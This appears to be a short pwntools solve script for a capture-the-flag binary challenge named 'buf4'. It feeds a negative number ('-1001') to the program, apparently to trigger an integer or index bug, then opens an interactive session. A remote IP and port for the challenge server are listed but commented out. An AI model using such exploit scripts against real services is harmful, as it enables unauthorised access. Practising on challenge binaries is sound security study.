from pwn import *

host, port = "34.80.245.238", 33336 
# a = remote(host,port)
a = process('./buf4')
raw_input()
a.recvuntil('Input 0 to exit the challenge!')
a.sendline('-1001')
a.recvuntil('Input your choice(Y/N)_ ')
a.sendline('Y')

a.interactive()